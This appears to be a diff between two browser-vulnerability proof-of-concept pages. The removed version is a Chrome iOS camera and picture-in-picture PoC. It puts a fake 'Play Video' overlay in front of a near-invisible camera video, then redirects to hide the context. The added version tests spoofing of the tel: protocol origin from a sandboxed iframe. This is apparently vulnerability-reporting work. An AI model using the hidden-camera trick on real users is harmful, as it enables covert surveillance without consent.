@@ -1,86 +1,41 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="utf-8">
-<title>Chrome iOS Camera + PiP PoC</title>
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-
-<style>
-html, body {
-  margin: 0;
-  padding: 0;
-  height: 100%;
-  background: black;
-  font-family: -apple-system, BlinkMacSystemFont, system-ui;
-  overflow: hidden;
-}
-
-/* Fake UI */
-#overlay {
-  position: fixed;
-  inset: 0;
-  background: black;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  z-index: 10;
-}
-
-#play {
-  background: white;
-  color: black;
-  font-size: 22px;
-  padding: 18px 40px;
-  border-radius: 14px;
-}
-
-/* Camera video */
-video {
-  position: fixed;
-  inset: 0;
-  width: 100%;
-  height: 100%;
-  object-fit: cover;
-  opacity: 0.01; /* hampir tidak terlihat */
-}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PoC - Tel Protocol Spoofing</title>
+    <style>
+        body { font-family: Arial, sans-serif; }
+        h1 { color: #2c3e50; }
+        button { padding: 10px 20px; font-size: 16px; cursor: pointer; }
+    </style>
 </head>
-
 <body>
 
-<div id="overlay">
-  <div id="play">▶️ Play Video</div>
-</div>
+<h1>Test for Tel Protocol Spoofing in Sandboxed Iframe</h1>
 
-<video id="camera" autoplay playsinline muted></video>
+<!-- Button to trigger 'tel:' protocol -->
+<button onclick="window.open('tel:1234567890')">ClickMe to trigger tel: protocol</button>
+
+<!-- Sandboxed iframe -->
+<iframe src="about:blank" sandbox="allow-scripts" id="sandboxedIframe" style="width: 100%; height: 200px; border: 1px solid #ccc;"></iframe>
 
 <script>
-const overlay = document.getElementById('overlay');
-const camera  = document.getElementById('camera');
-
-overlay.addEventListener('click', async () => {
-  overlay.remove();
-
-  // 1️⃣ Trigger camera permission
-  setTimeout(async () => {
-    try {
-      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-      camera.srcObject = stream;
-
-      // 2️⃣ Attempt PiP
-      if (document.pictureInPictureEnabled) {
-        try {
-          await camera.requestPictureInPicture();
-        } catch (e) {}
-      }
-    } catch (e) {}
-  }, 80);
-
-  // 3️⃣ Redirect (context loss)
-  setTimeout(() => {
-    location.href = "https://google.com:8080";
-  }, 80);
-});
+    // This script will dynamically load iframe content and simulate tel: protocol
+    const iframe = document.getElementById('sandboxedIframe');
+    
+    // Injecting HTML content into the iframe to simulate a different origin (for PoC purpose)
+    iframe.contentWindow.document.open();
+    iframe.contentWindow.document.write(`
+        <html>
+            <body>
+                <h2>Inside Sandbox</h2>
+                <p>This iframe is sandboxed with allow-scripts but is unable to display the correct initiating origin.</p>
+                <button onclick="parent.open('tel:9876543210')">ClickMe (Inside iframe) - Initiate tel: Protocol</button>
+            </body>
+        </html>
+    `);
+    iframe.contentWindow.document.close();
 </script>
 
 </body>
